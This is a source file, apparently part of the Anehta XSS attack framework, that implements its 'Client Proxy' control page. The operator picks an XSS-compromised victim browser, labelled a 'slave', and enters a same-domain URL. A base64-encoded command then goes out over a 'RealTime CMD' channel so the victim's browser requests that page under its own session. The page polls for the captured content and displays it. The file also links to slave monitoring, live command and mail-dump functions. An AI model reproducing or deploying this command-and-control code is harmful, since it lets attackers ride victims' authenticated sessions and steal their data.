<?php
  //加载auth类
  include_once("class/auth_Class.php");

  header("Content-Type: text/html; charset=utf-8");
  
  if (checkLoginStatus($U, $P, $textKey) == false){
  	return false;
  }
?>
<html>
<head>
		<title>
			Anehta!
		</title>
	  <script src="../library/anehta.js" ></script>
	  <script src="../library/jQuery.js" ></script>
	  <script src="../server/js/effects.core.js"></script>
	  <script src="../server/js/ui.core.js"></script>
	  <script src="../server/js/effects.bounce.js"></script>
	  <script src="../server/js/effects.slide.js"></script>
	  <script src="../server/js/effects.shake.js"></script>
	  <!-- script src="../server/js/effects.explode.js"></script -->
	  <script src="../server/js/effects.clip.js"></script>
	  <script src="../server/js/ui.accordion.js"></script>
	  <script src="../server/js/ui.draggable.js"></script>
	  <script src="../server/js/ui.dialog.js"></script>
	  <script src="../server/js/ui.resizable.js"></script>	  
	  
	  <!-- 加载 JSONER -->
	  <script src="../server/js/_compressed_jsoner.commons.js"></script>
    <script src="../server/js/_compressed_jsoner.js"></script>
    <script src="../server/js/_compressed_jsoner.serializer.js"></script>
    <script src="../server/js/jsoner.undomanager.js"></script>
    <script src="../server/js/jsoner.updater.js"></script>	  
	  
	  <script src="../server/js/loadData.js"></script>
	  <script>
	  function refreshProxy(){
	  	setTimeout(function(){
    	    // 创建一个展示proxy的窗口
    	    var showproxy = $d.createElement("div");
    	    showproxy.id = "showproxy";
    	    showproxy.style.border = "1px solid #c0c0c0";
    	    showproxy.style.width = "800px";
    	    showproxy.style.height = "490px";
    	    showproxy.style.overflow = "auto";
    	    showproxy.style.float = "left";
    	    showproxy.style.margin = "15 15 15 15px";
    	    showproxy.style.padding = "0px";
    	    $("#blackboard")[0].appendChild(showproxy);		
        },
        1500);
      
    	setInterval(function(){
    		  var ts = new Date(); //加随机数，以保证不被浏览器cache
    	    $.getJSON("../server/jsoncallback.php?jsoncallback=getClientProxy&ts="+ts.getTime(),
    	      function(data){
    	    	  //alert(data);
    	    	  // 所有slave记录都存到cache中
    	    	  anehtaCache.removeItem("clientProxy"); // 释放内存
    	    	  anehtaCache.setItem("clientProxy", data.clientProxy);
    
              // 释放内存
	            setTimeout(function(){data = null;}, 500);    	    	      	    	  
    	      }
    	    );
    		  setTimeout(function(){
    		  	  
    		  	  var pp = anehtaCache.getItem("clientProxy");
    		  	  //alert(decodeURIComponent(pp.record.pageContent));    		  	  
    		  	  //anehta.dom.getDocument(showproxy).write(decodeURIComponent(pp.record.pageContent)); 
    		  	  if (pp){  
    		  	    showproxy.innerHTML = null; // 释放内存
    		  	    showproxy.innerHTML = decodeURIComponent(pp.record.pageContent);    	
    		  	  }	  	
    		    },
    		    1000);
    	  },
    	  6000);
    }
	  </script>
	  <link rel="stylesheet" type="text/css" href="css/style.css" />
</head>
<body onload="javascript: initData(); refreshProxy();">


<img id="logo" style="float:top;z-index: 19999" src="../server/img/logo.jpg" />	
<ul id="basictab" class="basictab">	
<li style="margin: 0 0 0 188px;"><a href="../server/admin.php">Home</a></li>
<li><a href="../server/slavemonitor.php">Slave Monitor</a></li>
<li><a href="../server/rtcmd.php">RealTime CMD</a></li>
<li class="selected" ><a href="../server/clientproxy.php">Client Proxy</a></li>
<li><a href="../server/onlineproxy.php">Online Proxy</a></li>
<li><a href="../server/config.php">Configure</a></li>
<li><a href="../server/help.php">Help</a></li>
<a href="../server/logout.php">Logout</a>
</ul>



<div id="xssSites" class="wireframemenu" style="float:left;" >
<ul>
<!--
<li onMouseover="dropdownmenu(this, event, menu2, '150px')" onMouseout="delayhidemenu()" ><a href="">Anehta</a></li>
<li><a href="">Anehta</a></li>
<li><a href="">Anehta</a></li>
-->
</ul>
<a href="../server/rss.xml"><img style="float:top;" border="0" src="../server/img/rss.png" ></img>&nbsp;订阅Slave RSS</a>
<a href="javascript:dumpToMail();" ><img style="width= 1px; height= 1px;" border="0" src="../server/img/mail.gif" ></img>&nbsp;Dump to Mail</a>
</div>


<script>

// 每个页面的 dosomething可能不同
function dosomething(o){
	var slaveid = o.innerHTML;
	var whichDomain = obj_call_dropdownmenu.innerHTML;

	if (slaveid == "null"){
		return false;
	}
	
	// 复制 slaveWatermark到 input框
	$d.getElementById("chooseSlaveId").value = "Slave_"+slaveid;
}

// 提交clientproxy参数
function clientProxy(){
	var slaveid = $("#chooseSlaveId")[0].value;
	var gotoURL = $("#goToURL")[0].value;
	var proxyMethod = $("#proxyMethod")[0].value;
	var whichDomain;
	
	// 先检查domain是否正确
	for (i=(slaveData.record.length - 1); i>=0; i--){ // 从最新的找起
	  if (slaveData.record[i].slaveWatermark == slaveid.substr(6)){		// 最新一条记录
	  	whichDomain = slaveData.record[i].xssGot.requestURI;			  	
		  break;					
		}
	}

	if (!slaveid){
		alert("Please Input Slave Id!");
		return false;
	} 
	else if (!gotoURL || gotoURL == "http://"){
		alert("Please Input gotoURL!");
		return false;
	}
	else if (gotoURL.indexOf('"') > -1){
		alert("badchar: \"");
		return false;
	}
	else if (!whichDomain){
		alert("No Such Slave Domain Record!");
		return false;
	}
	else if( ($.trim(whichDomain).split('/'))[2] != ($.trim(gotoURL).split('/'))[2] ){
		alert("Can not Cross Domain!");
		return false;
	}
	
	// 传达需要访问的地址给服务器	
	var c = "anehta.ajax.clientProxy(\""+gotoURL+"\", \""+proxyMethod+"\");";
	c = anehta.crypto.base64Encode(c);
	// 使用实时命令的通道
	anehta.ajax.post("../server/rtcmd.php", "slave="+slaveid+"&cmd="+c);	
}


</script>
 
<style> 
.chooseSlave {
	padding:5px; 
	float:left; 
	margin: 15 0 0 15px;	
} 

.chooseSlave li{
  list-style-type:none; 
  margin: 0 0 5 5px;
  float: left;
  width: 600;
} 

.chooseSlave label{
	font-size: 12px; 
	font-family: verdana; 
	color: grey;
	float: left;
	text-align: left;
}

.chooseSlave input{
	float: left;
} 
 
</style> 
<div id="shiftcontainer" class="shiftcontainer" style="margin: 0 0 0 15px; float: left;">
  <div class="shadowcontainer" style="width: 850px; ">
    <div id="blackboard" class="innerdiv" style="height:650px;" >
      <div id="chooseSlave" class="chooseSlave" name="chooseSlave">
      	<li>
      	  <label for="goToURL"><b>Goto URL:&nbsp;&nbsp;</b></label>
          <input id="goToURL" name="goToURL" type="text" style="width:500px;" value="http://" />
        </li>

        <li>
      	  <label for="proxyMethod"><b>Method:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b></label>
      	  <select id="proxyMethod" name="proxyMethod" style="float:left;" >
      	  	<option value="Get">Get</option>
      	  	<option value="Post">Post</option>
      	  </select>
      	  
        </li>

        <li>
      	  <label for="chooseSlaveId"><b>Slave:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b></label>
      	  <input id="chooseSlaveId" name="chooseSlaveId" type="text" style="width: 150px;" value="" />
        </li>

        <li>
      	  <input id="submitProxy" type=submit class="formbutton2" onclick="return clientProxy();" value="Go!" />
        </li>
      </div>
    </div>
  </div>
</div>

<div align="center">	
	 <!--footer-->
  <div class="clear">
    <div class="line2">
    </div>
    <div class="clear">
      <label for="foot" style="color: #666666; font-size: 14px;">&copy;2008 <a href="http://anehta.googlecode.com">Anehta</a></label>
    </div>
  </div>
</div>

</body>
</html>
